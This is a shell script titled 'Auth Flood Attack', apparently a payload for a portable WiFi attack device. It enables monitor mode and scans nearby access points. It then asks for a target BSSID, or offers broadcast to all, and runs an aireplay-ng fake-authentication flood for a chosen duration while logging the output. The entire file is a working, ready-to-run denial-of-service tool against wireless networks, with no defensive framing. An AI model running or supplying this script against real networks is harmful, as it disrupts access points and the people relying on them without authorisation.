#!/bin/sh
# Title: Auth Flood Attack
# Author: NullSec
# Description: Authentication flood using aireplay-ng
# Category: WiFi Attack

LOOT_DIR="/mmc/nullsec/authflood"
mkdir -p "$LOOT_DIR"

echo "🌊 AUTH FLOOD ATTACK"
echo "━━━━━━━━━━━━━━━━━━━━━"

# Check interface
[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }

# Enable monitor mode
echo "[*] Enabling monitor mode..."
airmon-ng start wlan0 >/dev/null 2>&1
MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
[ -z "$MON_IF" ] && MON_IF="wlan0mon"

# Scan for targets
echo "[*] Scanning for targets (10s)..."
timeout 10 airodump-ng "$MON_IF" -w /tmp/authflood --output-format csv 2>/dev/null &
sleep 10

# Parse targets
if [ -f /tmp/authflood-01.csv ]; then
    echo ""
    echo "Available targets:"
    grep -E "^[0-9A-F]{2}:" /tmp/authflood-01.csv 2>/dev/null | head -10 | nl -w2 -s") "
    echo ""
    echo -n "Enter target BSSID (or 'all' for broadcast): "
    read TARGET_BSSID
else
    echo "[!] No targets found, using broadcast"
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
fi

echo -n "Duration in seconds [60]: "
read DURATION
DURATION=${DURATION:-60}

echo ""
echo "[*] Starting auth flood..."
if [ "$TARGET_BSSID" = "all" ]; then
    TARGET_BSSID="FF:FF:FF:FF:FF:FF"
fi

# Use aireplay-ng fake auth flood
timeout $DURATION aireplay-ng -1 0 -e "flood" -a "$TARGET_BSSID" -h $(cat /sys/class/net/$MON_IF/address) "$MON_IF" 2>&1 | tee "$LOOT_DIR/flood_$(date +%Y%m%d_%H%M).log" &

FLOOD_PID=$!
echo "[+] Flood running (PID: $FLOOD_PID)"
echo "[*] Press Ctrl+C to stop"
wait $FLOOD_PID

# Cleanup
airmon-ng stop "$MON_IF" >/dev/null 2>&1
rm -f /tmp/authflood* 2>/dev/null

echo ""
echo "[+] Auth flood complete"
